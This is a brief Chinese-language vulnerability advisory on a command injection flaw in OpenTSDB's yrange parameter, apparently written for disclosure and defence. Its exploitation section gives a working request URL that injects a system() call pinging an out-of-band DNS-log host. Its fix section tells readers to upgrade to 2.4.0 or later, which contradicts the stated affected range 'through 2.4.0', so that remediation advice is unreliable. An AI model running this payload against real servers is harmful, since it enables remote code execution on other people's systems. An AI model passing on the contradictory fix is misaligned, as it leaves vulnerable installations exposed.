### 一 漏洞描述
OpenTSDB是一套开源的、可扩展的分布式时间序列数据库。

OpenTSDB through 2.4.0版本存在命令注入漏洞，该漏洞源于远程代码执行漏洞通过yrange参数中的命令注入，yrange值被写入tmp目录中的gnuplot文件中。然后通过mygnupload .sh shell脚本执行该文件。

### 二 漏洞利用
```
url = f"{scheme}://{target}:{port}/q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[0:system(%27ping%20-c%201%20{dns_log}%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

### 三 漏洞修复
升级OpenTSDB版本大于等于2.4.0

> 参考链接  
> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-1211
